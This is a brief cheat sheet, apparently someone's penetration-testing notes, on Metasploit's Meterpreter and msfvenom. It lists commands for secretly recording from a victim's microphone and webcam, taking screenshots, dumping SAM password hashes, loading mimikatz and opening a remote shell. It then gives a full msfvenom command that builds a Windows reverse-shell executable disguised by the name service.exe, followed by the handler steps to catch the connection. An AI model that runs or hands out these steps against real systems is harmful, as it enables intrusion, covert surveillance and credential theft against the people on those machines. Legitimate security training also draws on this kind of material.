			Meterpreter
### Webcam
- `record_mic`     Record audio from the default microphone for X seconds
- `webcam_chat`    Start a video chat
- `webcam_list`    List webcams
- `webcam_snap`    Take a snapshot from the specified webcam
- `webcam_stream`  Play a video stream from the specified webcam

### Misc

- `hashdump` will retrieve all hashed frm sam file
- `load kiwi` will in let us use mimikatz
- `screenshot` Grab a screenshot of the interactive desktop
- `shell`  get a shell on remote machine

# MSFvenoim
## Make shell
- get public ip `curl ifconfig.me`
- `msfvenom -p windows/meterpreter/reverse_tcp lhost=$IP lport=443 -f exe > service.exe`
## Getting a meterpreter shell
- `use exploit/multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
-  `set lhost $IP`
- `lport 443`
- `exploit`


https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/